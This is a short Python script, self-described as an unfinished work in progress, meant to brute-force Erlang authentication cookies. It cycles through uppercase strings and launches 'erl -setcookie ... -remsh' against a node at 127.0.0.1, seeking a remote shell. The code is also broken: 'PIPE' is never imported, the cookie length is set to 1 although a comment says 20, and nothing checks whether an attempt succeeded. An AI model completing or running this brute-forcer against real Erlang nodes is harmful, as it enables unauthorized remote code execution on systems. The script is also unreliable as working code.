#!/bin/python3

# Python script aimed at bruteforcing Erlang authentication cookies

# This script is still a work-in-progress and it does not fully work yet.

# TODO:
#	- to find a way to process the output and see if and what cookie worked
# - to implement concurrent processing to make it faster

import subprocess
import sys
from multiprocessing import Pool
from itertools import product
from string import ascii_uppercase

length=1 # 20
target="target@127.0.0.1"

def test_cookie(cookie, name, target):
	# /bin/erl -setcookie 'AAAAAAAAAAAAAAAAAAAA' -name AAAAAAAAAAAAAAAAAAAA@127.0.0.1 -remsh target@127.0.0.1
	process = subprocess.Popen(['/bin/erl', '-setcookie', cookie, '-name', name, '-remsh', target], stdout=PIPE)
	try:
	    #print('Running in process', process.pid)
	    process.wait(timeout=0.1)
	except subprocess.TimeoutExpired:
	    #print('Timed out - killing', process.pid)
	    process.kill()
	#print("Done")

if __name__ == '__main__':
	for sequence in product(ascii_uppercase, repeat=length):
		cookie = "'"+''.join(sequence)+"'" # add single quote around it
		name =''.join(sequence)+"@127.0.0.1"
		#print("\n###########################################################")
		#print("Trying with cookie "+cookie+" to the target '"+target+"'\n")
		test_cookie(cookie, name, target)
